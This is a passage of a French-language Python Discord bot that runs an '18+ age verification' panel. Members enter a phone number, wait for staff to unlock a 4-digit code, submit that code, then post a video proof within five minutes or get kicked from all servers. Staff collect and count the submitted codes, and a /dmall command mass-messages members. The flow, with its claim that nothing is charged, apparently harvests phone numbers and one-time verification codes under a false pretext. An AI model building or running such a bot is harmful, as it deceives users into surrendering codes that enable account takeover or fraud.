                p = proofs.get(uid)
                if p is None or p["proof_sent"]:
                    return
                remaining = PROOF_WINDOW - (datetime.datetime.now().timestamp() - p["start_ts"])
                if remaining <= 0:
                    await proof_timeout(uid)
                    return
                mins = int(remaining // 60)
                try:
                    await p["message"].edit(embed=make_embed(mins, 0))
                except Exception:
                    pass
            except asyncio.CancelledError:
                return
            except Exception:
                log.exception("Countdown error")
                return

    task = asyncio.create_task(countdown())
    proofs[uid]["task"] = task

async def proof_done(uid: int):
    p = proofs.get(uid)
    if not p or p["proof_sent"]:
        return
    p["proof_sent"] = True

    if p.get("task"):
        p["task"].cancel()

    if p.get("video_msg") and p["video_msg"].attachments:
        video_archive[uid] = {
            "msg_id": p["video_msg"].id,
            "channel": p["video_msg"].channel,
            "attachment": p["attachment"],
            "staff_id": p.get("staff_id")
        }

    try:
        user = bot.get_user(uid) or await bot.fetch_user(uid)
        view = pending_users.get(uid, {}).get("view")
        phone_val = view.phone if view else ""
        embed = discord.Embed(color=COLOR_GREEN, timestamp=datetime.datetime.now())
        embed.set_author(name="Preuve envoyée", icon_url=user.display_avatar.url)
        try:
            embed.set_thumbnail(url=user.display_avatar.url)
        except Exception:
            pass
        embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
        embed.add_field(name="ID", value=f"`{uid}`", inline=True)
        if p.get("code"):
            embed.add_field(name="Code", value=f"**{mask_code(p['code'])}**", inline=True)
        if phone_val:
            embed.add_field(name="Numéro", value=f"`{mask_phone(phone_val)}`", inline=True)
        embed.add_field(name="Statut", value="Preuve envoyée — vérification en cours", inline=False)
        embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
        try:
            await p["message"].edit(embed=embed, view=None)
        except Exception:
            pass
        asyncio.create_task(send_log(title="Preuve vidéo envoyée", color=COLOR_GREEN, fields=[
            ("Utilisateur", f"<@{uid}>", True),
            ("Staff", f"<@{p['staff_id']}>" if p["staff_id"] else "—", True),
        ], user=user, ping=p["staff_id"] or 0))
    except Exception:
        log.exception("Proof done error")

async def proof_timeout(uid: int):
    p = proofs.pop(uid, None)
    if not p:
        return

    if p.get("task"):
        p["task"].cancel()

    try:
        user = bot.get_user(uid) or await bot.fetch_user(uid)
        staff_id = p.get("staff_id")

        log.info(f"TIMEOUT PROOF: Banning user {uid}")

        for g in list(bot.guilds):
            try:
                m = g.get_member(uid)
                if m:
                    await g.kick(m, reason="Preuve vidéo non fournie dans le délai imparti")
                    log.info(f"✅ User {uid} kicked from {g.name}")
            except Exception:
                log.exception(f"❌ Error kicking {uid} from {g.name}")

        proof_channel = get_proof_channel()
        if proof_channel and p.get("message"):
            try:
                embed = discord.Embed(color=COLOR_RED, timestamp=datetime.datetime.now())
                embed.set_author(name="⛔ UTILISATEUR BANNI", icon_url=user.display_avatar.url)
                try:
                    embed.set_thumbnail(url=user.display_avatar.url)
                except Exception:
                    pass
                embed.add_field(name="Utilisateur", value=f"{user.mention}", inline=True)
                embed.add_field(name="ID", value=f"`{uid}`", inline=True)
                if p.get("code"):
                    embed.add_field(name="Code", value=f"**{mask_code(p['code'])}**", inline=True)
                if staff_id:
                    embed.add_field(name="Vérificateur", value=f"<@{staff_id}>", inline=False)
                embed.add_field(name="Raison", value="Aucune preuve envoyée — Délai dépassé", inline=False)
                embed.add_field(name="Statut", value="🔴 BANNI DE TOUS LES SERVEURS", inline=False)
                embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))
                await p["message"].edit(embed=embed, view=None)
                log.info(f"✅ Message updated in proof channel for user {uid}")
            except Exception:
                log.exception("Error updating proof message")

        appeal_link = data.get("appeal_server_link", "https://discord.gg/example")
        unban_embed = discord.Embed(
            title="⛔ Vous avez été banni",
            description=(
                f"Vous n'avez pas fourni votre preuve vidéo à temps.\n\n"
                f"**Délai imparti :** 5 minutes\n"
                f"**Raison :** Preuve vidéo non fournie\n\n"
                f"Si vous pensez qu'il y a une erreur, vous pouvez rejoindre notre serveur d'appel pour contester cette décision."
            ),
            color=COLOR_RED
        )
        unban_embed.add_field(
            name="🔗 Serveur d'appel",
            value=f"[Cliquez ici pour rejoindre]({appeal_link})",
            inline=False
        )
        unban_embed.set_footer(text="Vous serez débanni après examen de votre dossier.")

        try:
            await user.send(embed=unban_embed)
            log.info(f"✅ Ban MP sent to user {uid}")
        except Exception:
            log.exception(f"Error sending ban MP to {uid}")

        asyncio.create_task(send_log(title="⛔ Preuve non fournie — Utilisateur banni", color=COLOR_RED, fields=[
            ("Utilisateur", f"<@{uid}>", True),
            ("Staff", f"<@{staff_id}>" if staff_id else "—", True),
            ("Action", "Ban de TOUS les serveurs", True),
        ], user=user, ping=staff_id or 0))
    except Exception:
        log.exception("Proof timeout error")

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        return

    proof_channel = get_proof_channel()
    if proof_channel and message.channel.id == proof_channel.id:
        has_video = any(att.content_type and att.content_type.startswith("video") for att in message.attachments)

        proof_role_id = get_proof_role_id()
        is_staff = isinstance(message.author, discord.Member) and proof_role_id and proof_role_id in [r.id for r in message.author.roles]

        is_user_in_proof = False
        for uid, p in list(proofs.items()):
            if message.author.id == uid or message.author.id == p.get("staff_id"):
                is_user_in_proof = True
                break

        if not is_staff and not is_user_in_proof and not has_video:
            try:
                await message.delete()
            except Exception:
                pass
            return

        if has_video:
            for uid, p in list(proofs.items()):
                if p["proof_sent"]:
                    continue
                if message.author.id == p.get("staff_id") or message.author.id == uid:
                    for att in message.attachments:
                        if att.content_type and att.content_type.startswith("video"):
                            p["video_msg"] = message
                            p["attachment"] = att
                            asyncio.create_task(proof_done(uid))
                            log.info(f"✅ Video received for user {uid}")
                            return

@bot.event
async def on_message_delete(message: discord.Message):
    for uid, arch in list(video_archive.items()):
        if arch["msg_id"] == message.id:
            channel = arch["channel"]
            staff_id = arch.get("staff_id")
            att = arch["attachment"]
            embed = discord.Embed(
                title="Preuve supprimée",
                description=f"La vidéo de <@{uid}> a été supprimée.\n\nElle a été renvoyée automatiquement ci-dessous.",
                color=COLOR_ORANGE,
                timestamp=datetime.datetime.now()
            )
            embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))

            content = f"<@{staff_id}> " if staff_id else ""
            try:
                file = discord.File(io.BytesIO(await att.read()), filename=att.filename)
                asyncio.create_task(channel.send(content=content, embed=embed, file=file))
            except Exception:
                log.exception("Reupload after delete error")
            break

# ==================== PANNEAU PUBLIC ====================

class VerifyView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            uid = interaction.user.id
            if uid in blacklisted_users:
                now = datetime.datetime.now().timestamp()
                denied_remaining = denied_users_cooldown.get(uid, 0) + DENY_COOLDOWN - now
                if denied_remaining > 0:
                    mins = int(denied_remaining // 60)
                    secs = int(denied_remaining % 60)
                    await safe_respond(interaction, discord.Embed(
                        title="Vérification refusée",
                        description=f"Votre vérification a été refusée.\n\nVous pouvez réessayer dans **{mins}m {secs:02d}s**.",
                        color=COLOR_RED
                    ))
                else:
                    blacklisted_users.discard(uid)
                    denied_users_cooldown.pop(uid, None)
                    blacklist_data["users"] = list(blacklisted_users)
                    save_blacklist(blacklist_data)
                    data["blacklisted_users"] = list(blacklisted_users)
                    save_data()

            await interaction.response.send_modal(PhoneModal())
        except discord.errors.NotFound:
            log.warning("VerifyView interaction not found")
        except Exception:
            log.exception("Verify error")

    @discord.ui.button(label="Code", style=discord.ButtonStyle.primary, custom_id="global_code_btn")
    async def code(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            pending = pending_users.get(interaction.user.id)
            if pending is None:
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Vous devez d'abord **Vérifier** votre numéro et attendre de recevoir un code.",
                    color=COLOR_GOLD
                ))
                return
            if not pending.get("unlocked"):
                await safe_respond(interaction, discord.Embed(
                    title="Vérification",
                    description="Vous n'avez pas encore reçu de code. Attendez, puis réessayez.",
                    color=COLOR_GOLD
                ))
                return
            await interaction.response.send_modal(CodeModal(interaction.user.id))
        except discord.errors.NotFound:
            log.warning("Code button interaction not found")
        except Exception:
            log.exception("Code button error")

# ==================== SALONS VOCAUX OBJECTIF ====================

async def update_member_channels():
    while True:
        try:
            for g in list(bot.guilds):
                count = g.member_count or 0
                if count < 100:
                    target = 100
                else:
                    target = ((count // 25) + 1) * 25

                name = f"🎯 {count}/{target} Membres"
                existing = None
                for vc in g.voice_channels:
                    if vc.name.startswith("🎯") and "Membres" in vc.name:
                        existing = vc
                        break
                if not existing:
                    try:
                        overwrite = discord.PermissionOverwrite(connect=False)
                        await g.create_voice_channel(name, overwrites={g.default_role: overwrite})
                    except Exception:
                        pass
                else:
                    if existing.name != name:
                        try:
                            await existing.edit(name=name)
                        except Exception:
                            pass
        except Exception:
            log.exception("Member channels error")
        await asyncio.sleep(300)

# ==================== COMMANDES ====================

class DMAllModal(discord.ui.Modal, title="DM All"):
    titre = discord.ui.TextInput(label="Titre du message", placeholder="Annonce", max_length=100, required=True)
    message_txt = discord.ui.TextInput(label="Message à envoyer", style=discord.TextStyle.paragraph, max_length=1500, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            await safe_respond(interaction, discord.Embed(
                title="DM All lancé",
                description="Envoi en cours à tous les membres du serveur...",
                color=COLOR_GOLD
            ))
            sent = 0
            failed = 0
            embed_dm = discord.Embed(title=self.titre.value, description=self.message_txt.value, color=COLOR_BLUE)
            for member in list(interaction.guild.members):
                if member.bot:
                    continue
                try:
                    await member.send(embed=embed_dm)
                    sent += 1
                except Exception:
                    failed += 1
                await asyncio.sleep(1.5)
            asyncio.create_task(send_log(title="DM All terminé", color=COLOR_BLUE, fields=[
                ("Envoyés", f"`{sent}`", True),
                ("Échecs (MP fermés)", f"`{failed}`", True),
                ("Par", f"<@{interaction.user.id}>", True),
            ]))
        except discord.errors.NotFound:
            log.warning("DMAll interaction not found")
        except Exception:
            log.exception("DMAll error")

@bot.tree.command(name="dmall", description="Envoie un message en MP à tous les membres")
async def dmall(interaction: discord.Interaction):
    try:
        if not has_staff_role(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED))
            return
        await interaction.response.send_modal(DMAllModal())
    except discord.errors.NotFound:
        log.warning("dmall interaction not found")
    except Exception:
        log.exception("dmall command error")

@bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification")
async def setupnsfw(interaction: discord.Interaction):
    try:
        embed = discord.Embed(color=COLOR_ORANGE)
        embed.set_author(name="VÉRIFICATION 18+ OBLIGATOIRE")
        embed.description = (
            "**RÈGLEMENT OFFICIEL DU SERVEUR — SERVEUR STRICTEMENT RÉSERVÉ AUX ADULTES (18+)**\n\n"
            "En restant sur ce serveur, vous confirmez être majeur et accepter l'intégralité du règlement ci-dessous.\n\n"
            "**ÂGE & VÉRIFICATION — Vérification obligatoire**\n"
            "• L'accès au serveur est strictement réservé aux personnes majeures.\n"
            "• Tout membre mineur ou suspecté de l'être sera banni définitivement.\n"
            "• Les salons NSFW nécessitent une validation préalable par la fourniture d'un numéro de téléphone pour recevoir un code de vérification à 4 chiffres. Ce processus est gratuit et rien ne sera facturé.\n\n"
            "**RESPECT & CONSENTEMENT — Respect des membres**\n"
            "• Les insultes, menaces, discriminations et harcèlement sont interdits.\n"
            "• Le consentement doit être respecté à tout moment.\n"
            "• Aucun contenu ou sollicitation non désiré ne sera toléré.\n\n"
            "**Messages privés & comportement**\n"
            "• Le spam MP, forcing ou comportements déplacés sont interdits.\n"
            "• Respect obligatoire envers les membres et le Staff.\n\n"
            "**CONTENUS INTERDITS — Contenus prohibés**\n"
            "• Tout contenu illégal entraîne un bannissement immédiat.\n"
            "• Le partage de contenus privés, leaks ou doxxing est strictement interdit.\n"
            "• Les liens malveillants, raids, nukes et phishing sont interdits.\n\n"
            "**UTILISATION DES SALONS — Organisation des salons**\n"
            "• Utilisez les salons adaptés au contenu partagé.\n"
            "• Les contenus hors-sujet pourront être supprimés.\n\n"
            "**Liens externes**\n"
            "• Les liens douteux ou frauduleux sont interdits.\n"
            "• Toute publicité sans autorisation est interdite, y compris en MP.\n\n"
            "**SÉCURITÉ & MODÉRATION — Sécurité du compte**\n"
            "• L'authentification à deux facteurs (2FA) est recommandée.\n"
            "• Ne partagez jamais vos informations personnelles.\n\n"
            "**Sanctions**\n"
            "• Le Staff peut warn, mute ou bannir sans avertissement préalable.\n"
            "• Les décisions du Staff sont définitives et non négociables.\n\n"
            "**VALIDATION**\n"
            "En restant sur ce serveur, vous confirmez avoir :\n"
            "• Lu le règlement\n"
            "• Compris les règles\n"
            "• Accepté les conditions du serveur\n\n"
            "Ce serveur est NSFW et contient du contenu pour adultes.\n\n"
            "**Pour vérifier votre âge :**\n"
            "Cliquez sur **\"Vérifier\"** ci-dessous, entrez votre numéro de téléphone, et suivez les instructions pour recevoir votre code de vérification à 4 chiffres."
        )
        await interaction.response.send_message(embed=embed, view=VerifyView())
    except discord.errors.NotFound:
        log.warning("setupnsfw interaction not found")
    except Exception:
        log.exception("setupnsfw command error")

@bot.tree.command(name="banpanel", description="Crée le panneau de bannissement")
async def banpanel(interaction: discord.Interaction):
    try:
        if not has_staff_role(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Staff uniquement.", color=COLOR_RED))
            return

        embed = discord.Embed(
            title="🔴 BANNISSEMENT",
            description="Cliquez sur le bouton ci-dessous pour bannir l'utilisateur",
            color=COLOR_RED
        )
        await interaction.response.send_message(embed=embed, view=QuickBanView())
    except discord.errors.NotFound:
        log.warning("banpanel interaction not found")
    except Exception:
        log.exception("banpanel command error")

@bot.tree.command(name="stat", description="Affiche les statistiques complètes")
async def stat(interaction: discord.Interaction):
    try:
        await interaction.response.defer(ephemeral=True)

        staff_channel = get_staff_channel()
        codes_channel = get_codes_channel()

        staff_count = 0
        codes_count = 0

        if staff_channel:
            try:
                async for _ in staff_channel.history(limit=5000):
                    staff_count += 1
            except Exception:
                log.exception("Error counting staff messages")

        if codes_channel:
            try:
                async for _ in codes_channel.history(limit=5000):
                    codes_count += 1
            except Exception:
                log.exception("Error counting codes messages")

        total_verifs = data.get("total_verifications", 0)
        total_codes = data.get("total_codes_received", 0)

        embed = discord.Embed(color=COLOR_BLUE, title="📊 Statistiques Complètes")
        embed.add_field(name="Messages salon Staff", value=f"`{staff_count}`", inline=True)
        embed.add_field(name="Messages salon Codes", value=f"`{codes_count}`", inline=True)
        embed.add_field(name="Vérifications totales", value=f"`{total_verifs}`", inline=True)
        embed.add_field(name="Codes reçus totaux", value=f"`{total_codes}`", inline=True)
        embed.add_field(name="Numéros blacklistés", value=f"`{len(blacklisted_numbers)}`", inline=True)
        embed.add_field(name="Utilisateurs blacklistés", value=f"`{len(blacklisted_users)}`", inline=True)
        embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))

        await interaction.followup.send(embed=embed, ephemeral=True)
    except discord.errors.NotFound:
        log.warning("stat interaction not found")
    except Exception:
        log.exception("stat command error")
        try:
            await interaction.followup.send(embed=discord.Embed(title="Erreur", description="Une erreur interne est survenue.", color=COLOR_RED), ephemeral=True)
        except Exception:
            pass

@bot.tree.command(name="codes", description="Affiche les statistiques de vérification")
async def codes(interaction: discord.Interaction):
    try:
        total_verifs = data.get("total_verifications", 0)
        total_codes = data.get("total_codes_received", 0)

        embed = discord.Embed(color=COLOR_BLUE, title="📊 Statistiques de Vérification")
        embed.add_field(name="Vérifications totales", value=f"`{total_verifs}`", inline=True)
        embed.add_field(name="Codes reçus", value=f"`{total_codes}`", inline=True)
        embed.set_footer(text=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'))

        await interaction.response.send_message(embed=embed, ephemeral=True)
    except discord.errors.NotFound:
        log.warning("codes interaction not found")
    except Exception:
        log.exception("codes command error")

@bot.tree.command(name="clear", description="Supprime des messages dans le salon")
async def clear(interaction: discord.Interaction, nombre: int = 10):
    try:
        if not interaction.user.guild_permissions.manage_messages:
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Permission manquante.", color=COLOR_RED))
            return
        if nombre < 1 or nombre > 100:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="Choisis un nombre entre 1 et 100.", color=COLOR_RED))
            return
        await interaction.response.defer(ephemeral=True)
        deleted = await interaction.channel.purge(limit=nombre)
        await interaction.followup.send(embed=discord.Embed(title="Messages supprimés", description=f"{len(deleted)} messages ont été supprimés.", color=COLOR_GREEN), ephemeral=True)
    except discord.errors.NotFound:
        log.warning("clear interaction not found")
    except Exception:
        log.exception("clear command error")

@bot.tree.command(name="sync", description="Sync les commandes")
async def sync(interaction: discord.Interaction):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        await interaction.response.defer(ephemeral=True)
        copied = await bot.tree.sync()
        await interaction.followup.send(embed=discord.Embed(title="Commandes synchronisées", description=f"`{len(copied)}` commandes synchronisées.", color=COLOR_GREEN), ephemeral=True)
    except discord.errors.NotFound:
        log.warning("sync interaction not found")
    except Exception:
        log.exception("sync command error")
        try:
            await interaction.followup.send(embed=discord.Embed(title="Erreur", description="Une erreur interne est survenue.", color=COLOR_RED), ephemeral=True)
        except Exception:
            pass

@bot.tree.command(name="acces", description="Donne l'accès vérification à un membre")
async def acces(interaction: discord.Interaction, member: discord.Member):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        if config.STAFF_ROLE_ID == 0:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED))
            return
        role = interaction.guild.get_role(config.STAFF_ROLE_ID)
        if not role:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="Rôle introuvable.", color=COLOR_RED))
            return
        await member.add_roles(role, reason="Accès vérification")
        await safe_respond(interaction, discord.Embed(title="Accès donné", description=f"{member.mention} peut maintenant gérer les vérifications.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("acces interaction not found")
    except Exception:
        log.exception("acces command error")

@bot.tree.command(name="delacces", description="Retire l'accès vérification à un membre")
async def delacces(interaction: discord.Interaction, member: discord.Member):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        if config.STAFF_ROLE_ID == 0:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="STAFF_ROLE_ID non configuré.", color=COLOR_RED))
            return
        role = interaction.guild.get_role(config.STAFF_ROLE_ID)
        if role and role in member.roles:
            await member.remove_roles(role, reason="Accès retiré")
        await safe_respond(interaction, discord.Embed(title="Accès retiré", description=f"{member.mention} ne peut plus gérer les vérifications.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("delacces interaction not found")
    except Exception:
        log.exception("delacces command error")

@bot.tree.command(name="bypassrole", description="Configure le rôle bypass vérification")
async def bypassrole(interaction: discord.Interaction, role: discord.Role):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["bypass_role"] = role.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} bypass la vérification.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("bypassrole interaction not found")
    except Exception:
        log.exception("bypassrole command error")

@bot.tree.command(name="bypass", description="Donne le bypass vérification à un membre")
async def bypass(interaction: discord.Interaction, member: discord.Member):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        rid = get_bypass_role_id()
        if not rid:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="Configure d'abord le rôle avec /bypassrole.", color=COLOR_RED))
            return
        role = interaction.guild.get_role(rid)
        if not role:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="Rôle introuvable.", color=COLOR_RED))
            return
        await member.add_roles(role, reason="Bypass vérification")
        await safe_respond(interaction, discord.Embed(title="Bypass donné", description=f"{member.mention} n'a plus besoin de la vidéo de preuve.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("bypass interaction not found")
    except Exception:
        log.exception("bypass command error")

@bot.tree.command(name="delbypass", description="Retire le bypass vérification à un membre")
async def delbypass(interaction: discord.Interaction, member: discord.Member):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        rid = get_bypass_role_id()
        if not rid:
            await safe_respond(interaction, discord.Embed(title="Erreur", description="Configure d'abord le rôle avec /bypassrole.", color=COLOR_RED))
            return
        role = interaction.guild.get_role(rid)
        if role and role in member.roles:
            await member.remove_roles(role, reason="Bypass retiré")
        await safe_respond(interaction, discord.Embed(title="Bypass retiré", description=f"{member.mention} devra fournir la vidéo de preuve.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("delbypass interaction not found")
    except Exception:
        log.exception("delbypass command error")

@bot.tree.command(name="salonstaff", description="Configure le salon de réception des demandes")
async def salonstaff(interaction: discord.Interaction, salon: discord.TextChannel):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["staff_channel"] = salon.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les demandes arriveront dans {salon.mention}.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("salonstaff interaction not found")
    except Exception:
        log.exception("salonstaff command error")

@bot.tree.command(name="salonlogs", description="Configure le salon des logs")
async def salonlogs(interaction: discord.Interaction, salon: discord.TextChannel):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["log_channel"] = salon.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les logs iront dans {salon.mention}.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("salonlogs interaction not found")
    except Exception:
        log.exception("salonlogs command error")

@bot.tree.command(name="salonproof", description="Configure le salon des preuves vidéo")
async def salonproof(interaction: discord.Interaction, salon: discord.TextChannel):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["proof_channel"] = salon.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les preuves vidéo se feront dans {salon.mention}.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("salonproof interaction not found")
    except Exception:
        log.exception("salonproof command error")

@bot.tree.command(name="saloncodes", description="Configure le salon des codes")
async def saloncodes(interaction: discord.Interaction, salon: discord.TextChannel):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["codes_channel"] = salon.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Salon configuré", description=f"Les codes s'afficheront dans {salon.mention}.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("saloncodes interaction not found")
    except Exception:
        log.exception("saloncodes command error")

@bot.tree.command(name="roleproof", description="Configure le rôle à ping pour les preuves")
async def roleproof(interaction: discord.Interaction, role: discord.Role):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["proof_role"] = role.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera ping pour les preuves.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("roleproof interaction not found")
    except Exception:
        log.exception("roleproof command error")

@bot.tree.command(name="appeallink", description="Configure le lien du serveur d'appel")
async def appeallink(interaction: discord.Interaction, lien: str):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["appeal_server_link"] = lien
        save_data()
        await safe_respond(interaction, discord.Embed(title="Lien configuré", description=f"Lien d'appel défini : `{lien}`", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("appeallink interaction not found")
    except Exception:
        log.exception("appeallink command error")

@bot.tree.command(name="banrole", description="Configure le rôle de bannissement")
async def banrole(interaction: discord.Interaction, role: discord.Role):
    try:
        if not is_owner(interaction):
            await safe_respond(interaction, discord.Embed(title="Refusé", description="Owner uniquement.", color=COLOR_RED))
            return
        data["ban_role"] = role.id
        save_data()
        await safe_respond(interaction, discord.Embed(title="Rôle configuré", description=f"Le rôle {role.mention} sera attribué au bannissement.", color=COLOR_GREEN))
    except discord.errors.NotFound:
        log.warning("banrole interaction not found")
    except Exception:
        log.exception("banrole command error")

# ==================== ON_READY ====================

@bot.event
async def on_ready():
    log.info(f"Connecté : {bot.user}")
    try:
        synced = await bot.tree.sync()
        log.info(f"Commandes synchronisées : {len(synced)} commandes.")
    except Exception:
        log.exception("Sync error")

    bot.add_view(VerifyView())
    bot.add_view(ContestView())
    log.info("Boutons restaurés.")
    asyncio.create_task(start_health_server())
    asyncio.create_task(update_member_channels())

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant")
        exit(1)
    bot.run(config.BOT_TOKEN)
